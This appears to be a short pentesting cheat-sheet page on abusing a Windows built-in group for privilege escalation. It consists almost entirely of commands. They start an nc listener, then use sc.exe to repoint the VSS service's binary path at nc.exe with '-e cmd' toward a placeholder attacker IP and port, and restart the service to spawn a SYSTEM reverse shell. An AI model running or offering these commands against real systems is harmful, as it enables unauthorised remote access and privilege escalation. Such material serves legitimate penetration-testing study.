---
title: "Built-in Group"
date: 2024-7-24
tags: ["built-in group", "active driectory", "ad", "Windows", "privesc"]
---

#### Abuse #1. Modify Service Path

<div>

```console
# Start a nc listener
rlwrap nc -lvnp <LOCAL_PORT>
```

</div>

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
# Assumed nc.exe is uploaded
sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd <LOCAL_IP> <LOCAL_PORT>"
```

```console
# Stop service
sc.exe stop VSS
```

```console
# Start service
sc.exe start VSS
```

</div>

{{< /tabcontent >}}

<br>